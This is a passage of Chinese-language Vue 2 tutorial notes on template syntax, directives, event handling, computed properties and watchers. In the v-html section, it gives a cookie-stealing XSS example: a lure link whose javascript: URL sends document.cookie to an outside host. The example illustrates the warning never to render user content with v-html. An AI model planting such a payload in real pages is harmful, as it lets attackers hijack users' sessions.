   - 插值语法不仅可以用在文本内容中，还可以用在元素的属性中，但只能用于HTML标签中的文本内容和普通属性，不能用于特殊属性（如`class`、`style`等）。
2. **指令语法：**
   - 指令语法使用Vue.js提供的指令来操作DOM元素和绑定数据。
   - 指令语法以 `v-` 开头，例如`v-bind`、`v-if`、`v-for`等。
   - 指令语法用于实现更复杂的DOM操作和数据绑定，例如动态绑定属性、条件渲染、列表渲染等。

### 插值语法

Vue.js中的插值表达式使用双大括号 `{{ }}` 进行标识，用于在模板中插入数据或表达式的结果。以下是一些示例来说明Vue.js的插值表达式的格式和内容：
1. **插入数据：**
```html
   <div>
     <p>{{ message }}</p>
   </div>
```
   在上面的示例中，`{{ message }}` 是一个插值表达式，它会在页面上显示`message`变量的值。
2. **表达式：**
```html
   <div>
     <p>{{ number + 1 }}</p>
   </div>
```
   在这个示例中，`{{ number + 1 }}` 是一个插值表达式，它会在页面上显示`number`变量的值加1的结果。
3. **调用函数：**
```html
   <div>
     <p>{{ formatName(name) }}</p>
   </div>
```
   在这个示例中，`{{ formatName(name) }}` 是一个插值表达式，它会在页面上显示调用`formatName`函数并传入`name`参数后的结果。
4. **三元表达式：**
```html
   <div>
     <p>{{ isReady ? 'Ready' : 'Not ready' }}</p>
   </div>
```
   在这个示例中，`{{ isReady ? 'Ready' : 'Not ready' }}` 是一个插值表达式，它会根据`isReady`变量的值显示不同的内容。

### 指令语法

在文本中可以使用插值表达式来将数据动态绑定到页面中，但在操作DOM元素及其属性时就需要用到指令语法

#### v-bind 单向数据绑定

在Vue.js中，`v-bind` 是一个指令，它的作用是动态地将一个或多个属性绑定到表达式或变量上。通过`v-bind`指令，我们可以实现动态地绑定HTML元素的属性，例如`href`、`class`、`style`等，从而根据数据的变化来动态地改变元素的属性值。
以下是`v-bind`的一些常见用法：
1. **绑定HTML属性：**
```html
   <a v-bind:href="url">Visit Vue.js Website</a>
```
   在这个例子中，`v-bind:href`指令将`href`属性绑定到`url`变量上，当`url`的值发生变化时，链接的地址也会相应地改变。
2. **动态CSS类名：**
```html
   <div v-bind:class="{ active: isActive, 'text-danger': hasError }"></div>
```
   在这个例子中，`v-bind:class`指令根据`isActive`和`hasError`变量的值动态地添加或移除CSS类名，实现动态的样式变化。
3. **绑定内联样式：**
```html
   <div v-bind:style="{ color: textColor, fontSize: fontSize + 'px' }">Dynamic Style</div>
```
   在这个例子中，`v-bind:style`指令将元素的内联样式绑定到`textColor`和`fontSize`变量上，实现动态的样式设置。
4. **绑定属性值：**
```html
   <input v-bind:value="inputValue">
```
   在这个例子中，`v-bind:value`指令将`input`元素的值绑定到`inputValue`变量上，使得输入框的值可以根据`inputValue`的变化而动态更新。
总之，`v-bind`指令是Vue.js中用于动态绑定属性的重要指令，通过它可以实现在模板中根据数据的变化动态地改变元素的属性值，使得页面能够实现更丰富的交互和动态效果。

`v-bind:` 可简写为 `:`

```html
   <input :value="inputValue">
```

#### v-model 双向数据绑定

Vue中有2种数据绑定的方式：
	1.单向绑定(v-bind)：数据只能从data流向页面。
	2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
		备注：
			1.双向绑定一般都应用在表单类元素上（如：input、select等）
			2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

```html
<input v-model:value="message" placeholder="Enter message"> 可简写为
<input v-model="message" placeholder="Enter message">
```


在Vue.js中，`v-model` 是一个指令，它主要用于实现表单输入元素和应用状态之间的双向数据绑定。通过`v-model`指令，我们可以轻松地实现表单输入元素（如input、textarea、select等）和Vue实例中数据的双向绑定，使得数据的变化能够自动反映在表单元素上，同时用户在表单元素上的输入也能够自动更新到数据中。
以下是`v-model`的一些常见用法：
1. **输入框的双向绑定：**
   ```html
   <input v-model="message" placeholder="Enter message">
   <p>{{ message }}</p>
   ```
   在这个例子中，`v-model="message"` 将输入框的值与Vue实例中的 `message` 数据进行双向绑定，当用户在输入框中输入内容时，`message`的值也会相应地更新，同时`message`的变化也会自动反映在输入框中。
2. **复选框的双向绑定：**
   ```html
   <input type="checkbox" v-model="checked">
   <p>{{ checked }}</p>
   ```
   在这个例子中，`v-model="checked"` 将复选框的状态与Vue实例中的 `checked` 数据进行双向绑定，当用户勾选或取消勾选复选框时，`checked`的值会相应地更新，同时`checked`的变化也会自动反映在复选框中。
3. **下拉框的双向绑定：**
   ```html
   <select v-model="selected">
     <option value="option1">Option 1</option>
     <option value="option2">Option 2</option>
   </select>
   <p>{{ selected }}</p>
   ```
   在这个例子中，`v-model="selected"` 将下拉框的选项值与Vue实例中的 `selected` 数据进行双向绑定，当用户选择不同的选项时，`selected`的值会相应地更新，同时`selected`的变化也会自动反映在下拉框中。

如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上

```html
<h2 v-model:x="name">你好啊</h2>
```

##### 收集表单数据

[表单输入绑定 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/forms.html)

```
收集表单数据：
	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
	若：<input type="checkbox"/>
			1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
			2.配置input的value属性:
					(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
					(2)v-model的初始值是数组，那么收集的的就是value组成的数组
	备注：v-model的三个修饰符：
					lazy：失去焦点再收集数据
					number：输入字符串转为有效的数字
					trim：输入首尾空格过滤
```

```html
<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
```

#### v-text 

```
1.作用：向其所在的节点中渲染文本内容。
2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
```

```html
<div id="root">
	<div>你好，{{name}}</div>
	<div v-text="name"></div>
	<div v-text="str"></div>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	
	new Vue({
		el:'#root',
		data:{
			name:'尚硅谷',
			str:'<h3>你好啊！</h3>'
		}
	})
</script>
```

#### v-html

```
v-html指令：
	1.作用：向指定节点中渲染包含html结构的内容。
	2.与插值语法的区别：
				(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
				(2).v-html可以识别html结构。
	3.严重注意：v-html有安全性问题！！！！
				(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
				(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
```

```html
<div v-html="str2"></div>
new Vue({
	el:'#root',
	data:{
		str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
	}
})
```

#### v-cloak

```
v-cloak指令（没有值）：
	1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
	2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
```

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
<script type="text/javascript">
	console.log(1)
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	
	new Vue({
		el:'#root',
		data:{
			name:'尚硅谷'
		}
	})
</script>
```

#### v-once

```
v-once指令：
	1.v-once所在节点在初次动态渲染后，就视为静态内容了。
	2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
```

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2 v-once>初始化的n值是:{{n}}</h2>
	<h2>当前的n值是:{{n}}</h2>
	<button @click="n++">点我n+1</button>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	
	new Vue({
		el:'#root',
		data:{
			n:1
		}
	})
</script>
```

#### v-pre

```
v-pre指令：
	1.跳过其所在节点的编译过程。
	2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2 v-pre>Vue其实很简单</h2>
	<h2 >当前的n值是:{{n}}</h2>
	<button @click="n++">点我n+1</button>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	new Vue({
		el:'#root',
		data:{
			n:1
		}
	})
</script>
```

#### 自定义指令

```
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
	需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
	自定义指令总结：
			一、定义语法：
						(1).局部指令：
									new Vue({															new Vue({
										directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
									}) 																		})
						(2).全局指令：
										Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
			二、配置对象中常用的3个回调：
						(1).bind：指令与元素成功绑定时调用。
						(2).inserted：指令所在元素被插入页面时调用。
						(3).update：指令所在模板结构被重新解析时调用。
			三、备注：
						1.指令定义时不加v-，但使用时要加v-；
						2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
```

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2>{{name}}</h2>
	<h2>当前的n值是：<span v-text="n"></span> </h2>
	<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
	<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
	<button @click="n++">点我n+1</button>
	<hr/>
	<input type="text" v-fbind:value="n">
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	//定义全局指令
	/* Vue.directive('fbind',{
		//指令与元素成功绑定时（一上来）
		bind(element,binding){
			element.value = binding.value
		},
		//指令所在元素被插入页面时
		inserted(element,binding){
			element.focus()
		},
		//指令所在的模板被重新解析时
		update(element,binding){
			element.value = binding.value
		}
	}) */
	new Vue({
		el:'#root',
		data:{
			name:'尚硅谷',
			n:1
		},
		directives:{
			//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
			/* 'big-number'(element,binding){
				// console.log('big')
				element.innerText = binding.value * 10
			}, */
			big(element,binding){
				console.log('big',this) //注意此处的this是window
				// console.log('big')
				element.innerText = binding.value * 10
			},
			fbind:{
				//指令与元素成功绑定时（一上来）
				bind(element,binding){
					element.value = binding.value
				},
				//指令所在元素被插入页面时
				inserted(element,binding){
					element.focus()
				},
				//指令所在的模板被重新解析时
				update(element,binding){
					element.value = binding.value
				}
			}
		}
	})
	
</script>
```

### 事件处理

#### 事件对象

```html
<input id="myButton" type="button" value="123"/>
        <script type="text/javascript">
            document.getElementById('myButton').addEventListener('click', function(a,b,c,d) {
                console.log(a,b,c,d)
                // a:PointerEvent {isTrusted: true, pointerId: 1, width: 1, height: 1, pressure: 0, …} 
                // b:undefined c:undefined d:undefined
            });
        </script>
```

在 JavaScript 中，当触发一个事件时，会自动创建一个事件对象（Event Object），这个事件对象包含了与事件相关的信息，比如事件类型、目标元素、鼠标位置等。开发者可以通过访问事件对象来获取这些信息，从而对事件进行处理。

事件对象通常作为事件处理函数的参数的第一个参数传递给事件处理函数。在事件处理函数中，可以通过访问事件对象来获取相关信息。以下是一些常用的事件对象属性和方法：
1. `event.type`：获取事件的类型，比如 "click"、"keydown" 等。
2. `event.target`：获取触发事件的目标元素。
3. `event.currentTarget`：获取绑定事件处理函数的当前元素。
4. `event.preventDefault()`：阻止事件的默认行为。
5. `event.stopPropagation()`：阻止事件冒泡。
6. `event.clientX` 和 `event.clientY`：获取鼠标相对于浏览器窗口的水平和垂直坐标。
7. `event.key`：获取按下的键盘按键。
8. `event.preventDefault()`：阻止事件的默认行为。
以下是一个简单的示例，演示了如何在事件处理函数中访问事件对象：
```javascript
document.getElementById('myButton').addEventListener('click', function(event) {
  console.log('触发的事件类型：', event.type);
  console.log('触发事件的目标元素：', event.target);
  console.log('鼠标点击的坐标：', event.clientX, event.clientY);
  event.preventDefault(); // 阻止事件的默认行为
});
```
通过访问事件对象，开发者可以获取到触发事件的相关信息，并根据需要对事件进行处理。事件对象在 JavaScript 中是非常重要的概念，可以帮助开发者更好地理解和处理用户交互。

此项特性在 vue 中同样适用，但在 vue 中，如果需要传输多个参数，需要用 `$event` 来标识事件对象参数

#### v-on:xxx

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				事件的基本使用：
							1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
							2.事件的回调需要配置在methods对象中，最终会在vm上；
							3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
							4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
							5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

#### 事件修饰符

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

在 Vue.js 中，事件修饰符是用来处理 DOM 事件的特殊修饰符，它们可以在事件处理程序中添加额外的功能或修改事件的行为。Vue 提供了一些常用的事件修饰符，下面是一些常见的事件修饰符及其作用：
1. `.stop`：阻止事件冒泡。
   用法：`@click.stop`
   
2. `.prevent`：阻止事件的默认行为。
   用法：`@submit.prevent`
   
3. `.capture`：使用事件捕获模式。
   用法：`@click.capture`
   
4. `.self`：只当事件是从触发元素自身触发时触发回调。
   用法：`@click.self`
   
5. `.once`：只触发一次。
   用法：`@click.once`
   
6. `.passive`：指示浏览器不要阻止事件的默认行为。
   用法：`@touchstart.passive`
   
7. `.native`：监听组件根元素的原生事件。
   用法：`@click.native`
   
8. `.sync`：用于子组件向父组件传递数据。
   用法：`@update:prop.sync`
   

使用事件修饰符时，需要在事件名后面加上 `.`，然后跟上修饰符名称。例如，`@click.stop` 表示点击事件触发时会阻止事件冒泡。事件修饰符可以方便地处理事件的行为，使代码更加清晰和易于理解。

##### 事件捕获模式

事件捕获模式是DOM事件传播的另一种模式，与事件冒泡相对应。在事件捕获模式中，事件从最外层的元素开始向内部元素传播，直到达到触发事件的目标元素为止。换句话说，事件捕获模式是从外向内的传播过程。
在事件捕获模式中，事件会首先在最外层的祖先元素上触发，然后逐级向内部元素传播，直到达到触发事件的目标元素。这与事件冒泡模式相反，事件冒泡模式是从目标元素开始向外传播。
在实际应用中，事件捕获模式并不常用，因为大多数情况下都是使用事件冒泡模式。但是，如果需要在事件传播过程中进行一些特定的操作或拦截，可以利用事件捕获模式来实现。
在JavaScript中，可以通过在添加事件监听器时传入第三个参数为 `true` 来启用事件捕获模式。示例如下：
```javascript
element.addEventListener('click', myFunction, true);
```
在这个示例中，`addEventListener` 方法的第三个参数为 `true`，表示启用事件捕获模式。这样事件就会在捕获阶段触发，然后再根据事件冒泡或者事件目标阶段的处理。
总的来说，事件捕获模式是DOM事件传播的一种模式，它与事件冒泡模式相对应，是从外向内传播的过程。在实际开发中，根据具体需求选择合适的事件传播模式来处理事件。

#### 键盘事件

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

### 计算属性

当需要在页面插入复杂值时可以采用以下方式

```html
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{firstName}}-{{lastName}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			}
		})
	</script>
```

也可以通过函数实现

```html
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
```

在Vue.js中，计算属性（Computed Properties）是一种便捷的方式来声明基于响应式数据的派生状态。计算属性的值会根据其依赖的响应式数据动态计算得出，并且计算属性具有缓存机制，只有在相关响应式数据发生改变时才会重新计算。
使用计算属性可以将复杂的逻辑计算逻辑封装起来，使得模板更加简洁和易读，同时也提高了性能，避免不必要的重复计算。
以下是一个简单的示例来说明计算属性的用法：
```html
<div id="app">
  <p>{{ message }}</p>
  <p>{{ reversedMessage }}</p>
</div>
```
```javascript
var vm = new Vue({
  el: '#app',
  data: {
    message: 'Hello, Vue!'
  },
  computed: {
    reversedMessage: function() {
      return this.message.split('').reverse().join('');
    }
  }
});
```
在这个示例中，我们定义了一个Vue实例 `vm`，其中包含一个数据属性 `message` 和一个计算属性 `reversedMessage`。计算属性 `reversedMessage` 返回 `message` 的反转字符串，通过 `split('').reverse().join('')` 实现。在模板中，我们可以直接使用 `reversedMessage` 来显示 `message` 的反转字符串，而不必在模板中编写复杂的逻辑。
需要注意的是，计算属性是基于它们的依赖进行缓存的。只有在依赖的响应式数据发生变化时，计算属性才会重新计算。这样可以避免不必要的计算，提高性能。

在Vue.js中，`computed` 和 `methods` 都是用于处理逻辑计算的选项，但它们之间有一些重要的区别：
1. **计算属性（computed）**：
   - 计算属性是基于它们的依赖缓存的。只有在计算属性的依赖发生变化时，计算属性才会重新计算。
   - 计算属性适用于基于响应式数据进行计算，并且具有缓存机制，避免不必要的重复计算。
   - 计算属性在模板中使用时，直接像数据属性一样使用，不需要在模板中调用方法。
2. **方法（methods）**：
   - 方法是在调用时执行的函数。每次调用方法时，都会执行其中的代码。
   - 方法适用于需要在模板中触发的事件处理或者动态计算的情况。
   - 方法没有缓存机制，每次调用方法都会执行其中的代码，不会像计算属性一样进行缓存。
   总的来说，计算属性适合用于基于响应式数据进行计算并且需要缓存结果的情况，可以简化模板中的逻辑计算；而方法适合用于需要在模板中触发的事件处理或者动态计算的情况，每次调用方法都会执行其中的代码。根据具体的需求，可以灵活选择使用计算属性或方法来处理逻辑计算。


计算属性：
	1.定义：要用的属性不存在，要通过已有属性计算得来。
	2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
	3.get函数什么时候执行？
				(1).初次读取时会执行一次。
				(2).当依赖的数据发生改变时会被再次调用。
	4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
	5.备注：
			1.计算属性最终会出现在vm上，直接读取使用即可。
			2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
            
```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			methods: {
				demo(){
					
				}
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```

当计算属性为只读时可简写为简写形式

```html
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
			},
			computed:{
				//完整写法
				/* fullName:{
					get(){
						console.log('get被调用了')
						return this.firstName + '-' + this.lastName
					},
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				} */
				//简写
				fullName(){
					console.log('get被调用了')
					return this.firstName + '-' + this.lastName
				}
			}
		})
	</script>
```

### 监视属性

监视属性watch：
	1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
	2.监视的属性必须存在，才能进行监视！！
	3.监视的两种写法：
			(1).new Vue时传入watch配置
			(2).通过vm.$watch监视
    4.监视属性可以监视计算属性，因为计算属性本身就在 vm 身上

```html
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			/* 
            // 写法一
            watch:{
				isHot:{
					immediate:true, //当immediate设置为true时，Vue实例在初始渲染时会立即执行watch监听函数，即使被监听的属性在初始状态下没有发生变化。这样可以确保在Vue实例初始化时也能执行相应的操作。
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
		})
        // 写法二
		vm.$watch('isHot',{
			immediate:true, //当immediate设置为true时，Vue实例在初始渲染时会立即执行watch监听函数，即使被监听的属性在初始状态下没有发生变化。这样可以确保在Vue实例初始化时也能执行相应的操作。
			//handler什么时候调用？当isHot发生改变时。
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
```

#### 深度监视

深度监视：
			(1).Vue中的watch默认不监测对象内部值的改变（一层）。
			(2).配置deep:true可以监测对象内部值改变（多层）。
	备注：
			(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
			(2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```html
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化
				/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
```

简写形式，只有不需要额外配置的时候才可以简写（immediate，deep...）

```html
watch:{
	//正常写法
	/* isHot:{
		// immediate:true, //初始化时让handler调用一下
		// deep:true,//深度监视
		handler(newValue,oldValue){
			console.log('isHot被修改了',newValue,oldValue)
		}
	}, */
	//简写
	/* isHot(newValue,oldValue){
		console.log('isHot被修改了',newValue,oldValue,this)
	} */
}

//正常写法
/* vm.$watch('isHot',{
